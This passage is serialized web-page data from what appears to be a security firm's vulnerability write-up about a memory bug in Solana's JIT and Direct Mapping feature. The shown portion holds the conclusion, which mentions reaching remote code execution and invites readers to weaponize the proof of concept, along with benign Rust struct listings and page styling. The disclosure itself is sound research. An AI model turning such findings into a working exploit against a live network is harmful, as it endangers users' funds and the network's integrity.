",\"$L11d1\",\"$L11d2\",\"$L11d3\",\"$L11d4\",\"$L11d5\",\"$L11d6\",\"$L11d7\",\"$L11d8\",\"$L11d9\",\"$L11da\",\"$L11db\",\"$L11dc\",\"$L11dd\",\"\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"db:[\"$\",\"p\",\"p-127\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"After successfully getting arbitrary read/write, remote code execution (RCE) would be achievable using traditional binary exploitation tricks.\"}]\ndc:[\"$\",\"div\",\"div-0\",{\"className\":\"relative w-full pb-[56.25%]\",\"children\":[\"\\n  \",[\"$\",\"iframe\",\"iframe-0\",{\"className\":\"absolute top-0 left-0 w-full h-full\",\"src\":\"https://www.youtube.com/embed/qlnRNFnFaXM?si=9nCPqBPqxjFJQHHb\",\"title\":\"YouTube video player\",\"allow\":\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\"}],\"\\n\"]}]\ndd:[\"$\",\"p\",\"p-128\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Notably, the PoCs shown here is no where near stable enough to launch an attack against an active Solana network. Specifically, we haven't implemented account spraying, and also used hardcoded offsets for calculating thread stack and ROPgadgets. However, there are well-established approaches in weaponizing such PoCs into exploits, and we leave this as an exercise for interested readers.\"}]\nde:[\"$\",\"h2\",\"h2-10\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"Final Thoughts\"}]\ndf:[\"$\",\"p\",\"p-129\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"As demonstrated, even memory-safe languages like Rust can harbor subtle and powerful vulnerabilities, especially in complex systems utilizing unsafe code to push the boundaries of performance and optimization. \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"What began as a curiosity about Solana’s JIT and memory model evolved into a critical finding that could have compromised the integrity of the entire network.\"}]]}]\ne0:[\"$\",\"p\",\"p-130\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"During "])</script><script>self.__next_f.push([1,"our disclosure of the bug to Solana, the team was highly responsive, and also fast to understand the concepts discussed in the report. They also made significant decisions such as putting the Direct Mapping feature on hold for further scrutiny, instead of hastily launching it to meet deadlines. While bugs are inevitable, Solana's professional handling of bug disclosures shows their commitment to security, and demonstrates why it deserves to be a top tier project.\"}]\ne1:[\"$\",\"p\",\"p-131\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"We had a lot of fun exploring this bug. Reading through code, understanding system design at a deep level, and crafting a non-obvious exploit path. These are the kinds of challenges we live for. Hopefully, this write-up sheds light on how the bug hunting process really works. It is not just about the final exploit, but about the twists, dead ends, and intuition that lead there. We hope you enjoyed reading it as much as we enjoyed the journey.\"}]\ne2:[\"$\",\"p\",\"p-132\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"At Anatomist Security, we specialize in uncovering such vulnerabilities through deep technical research and rigorous security audits. If you're building complex software, especially in fast-moving areas like blockchain, and want to ensure its robustness, reach out. We'd love to help.\"}]\n11de:T811,"])</script><script>self.__next_f.push([1,"\nmjx-container[jax=\"SVG\"] {\n  direction: ltr;\n}\n\nmjx-container[jax=\"SVG\"] \u003e svg {\n  overflow: visible;\n  min-height: 1px;\n  min-width: 1px;\n}\n\nmjx-container[jax=\"SVG\"] \u003e svg a {\n  fill: blue;\n  stroke: blue;\n}\n\nmjx-container[jax=\"SVG\"][display=\"true\"] {\n  display: block;\n  text-align: center;\n  margin: 1em 0;\n}\n\nmjx-container[jax=\"SVG\"][display=\"true\"][width=\"full\"] {\n  display: flex;\n}\n\nmjx-container[jax=\"SVG\"][justify=\"left\"] {\n  text-align: left;\n}\n\nmjx-container[jax=\"SVG\"][justify=\"right\"] {\n  text-align: right;\n}\n\ng[data-mml-node=\"merror\"] \u003e g {\n  fill: red;\n  stroke: red;\n}\n\ng[data-mml-node=\"merror\"] \u003e rect[data-background] {\n  fill: yellow;\n  stroke: none;\n}\n\ng[data-mml-node=\"mtable\"] \u003e line[data-line], svg[data-table] \u003e g \u003e line[data-line] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node=\"mtable\"] \u003e rect[data-frame], svg[data-table] \u003e g \u003e rect[data-frame] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node=\"mtable\"] \u003e .mjx-dashed, svg[data-table] \u003e g \u003e .mjx-dashed {\n  stroke-dasharray: 140;\n}\n\ng[data-mml-node=\"mtable\"] \u003e .mjx-dotted, svg[data-table] \u003e g \u003e .mjx-dotted {\n  stroke-linecap: round;\n  stroke-dasharray: 0,140;\n}\n\ng[data-mml-node=\"mtable\"] \u003e g \u003e svg {\n  overflow: visible;\n}\n\n[jax=\"SVG\"] mjx-tool {\n  display: inline-block;\n  position: relative;\n  width: 0;\n  height: 0;\n}\n\n[jax=\"SVG\"] mjx-tool \u003e mjx-tip {\n  position: absolute;\n  top: 0;\n  left: 0;\n}\n\nmjx-tool \u003e mjx-tip {\n  display: inline-block;\n  padding: .2em;\n  border: 1px solid #888;\n  font-size: 70%;\n  background-color: #F8F8F8;\n  color: black;\n  box-shadow: 2px 2px 5px #AAAAAA;\n}\n\ng[data-mml-node=\"maction\"][data-toggle] {\n  cursor: pointer;\n}\n\nmjx-status {\n  display: block;\n  position: fixed;\n  left: 1em;\n  bottom: 1em;\n  min-width: 25%;\n  padding: .2em .4em;\n  border: 1px solid #888;\n  font-size: 90%;\n  background-color: #F8F8F8;\n  color: black;\n}\n\nforeignObject[data-mjx-xml] {\n  font-family: initial;\n  line-height: normal;\n  overflow: visible;\n}\n\nmjx-container[jax=\"SVG\"] path[data-c], mjx-container[jax=\"SVG\"] use[data-c] {\n  stroke-width: 3;\n}\n"])</script><script>self.__next_f.push([1,"e3:[\"$\",\"style\",\"style-0\",{\"children\":\"$11de\"}]\ne4:[\"$\",\"div\",null,{\"className\":\"mt-16 pt-8 border-t border-white/10\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex items-center justify-center gap-4 text-xs tracking-[0.3em] text-white/40 font-mono uppercase\",\"children\":[[\"$\",\"span\",null,{\"className\":\"w-8 h-px bg-white/20\"}],[\"$\",\"span\",null,{\"children\":\":: END_TRANSMISSION\"}],[\"$\",\"span\",null,{\"className\":\"w-8 h-px bg-white/20\"}]]}]}]\ne5:[\"$\",\"$L11df\",null,{}]\n"])</script><script>self.__next_f.push([1,"e6:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\ne7:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\ne8:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\ne9:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nea:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\neb:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Variable-length state data\"]}]\nec:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ned:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\nee:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nef:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\nf0:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" owner\"]}]\nf1:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\nf2:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf3:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\nf4:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nf5:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf6:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Program authorized to modify this account\"]}]\nf7:[\"$\",\"span\",\"code-segment-44\",{\"className\":"])</script><script>self.__next_f.push([1,"\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf8:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\nf9:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nfa:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\nfb:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" executable\"]}]\nfc:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\nfd:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nfe:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\nff:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n100:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}]\n101:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Whether this account contains executable code\"]}]\n102:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n103:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n104:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n105:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n106:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" rent_epoch\"]}]\n107:[\"$\",\"span\",\"code-segment-60\","])</script><script>self.__next_f.push([1,"{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n108:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n109:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Epoch\"]}]\n10a:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n10b:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n10c:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Rent tracking information\"]}]\n10d:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n10e:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n10f:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n110:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n111:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n112:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Message\"]}]\n113:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n114:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n115:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n116:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n117:[\"$\",\"span\",\"code-segment-32\",{\"className\":"])</script><script>self.__next_f.push([1,"\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n118:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n119:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n11a:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n11b:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n11c:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n11d:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n11e:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}]\n11f:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n120:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Message\"]}]\n121:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n122:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n123:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n124:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n125:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"$undefi"])</script><script>self.__next_f.push([1,"ned\",\"style\":{},\"children\":[\"    \"]}]\n126:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n127:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" header\"]}]\n128:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n129:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n12a:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MessageHeader\"]}]\n12b:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n12c:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n12d:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Access type (read / write) of each accessed account\"]}]\n12e:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n12f:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n130:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n131:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n132:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" account_keys\"]}]\n133:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n134:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n135:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}]\n136:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\""])</script><script>self.__next_f.push([1,"]}]\n137:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\n138:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n139:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n13a:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n13b:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Accounts accessed by the transaction\"]}]\n13c:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n13d:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n13e:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n13f:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n140:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" instructions\"]}]\n141:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n142:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n143:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}]\n144:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n145:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CompiledInstruction\"]}]\n146:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n147:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n148:[\"$\",\""])</script><script>self.__next_f.push([1,"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}]\n149:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Actions performed by the transaction\"]}]\n14a:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n14b:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n14c:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n14d:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n14e:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n14f:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n150:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n151:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n152:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n153:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n154:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"c"])</script><script>self.__next_f.push([1,"olor\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n155:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n156:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n157:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n158:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}]\n159:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n15a:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MessageHeader\"]}]\n15b:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n15c:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n15d:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n15e:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n15f:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n160:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n161:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" num_required_signatures\"]}]\n162:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n163:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n164:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n165:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"c"])</script><script>self.__next_f.push([1,"hildren\":[\",\"]}]\n166:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n167:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\n168:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n169:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n16a:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" num_readonly_signed_accounts\"]}]\n16b:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n16c:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n16d:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n16e:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n16f:[\"$\",\"span\",\"code-segment-122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n170:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber 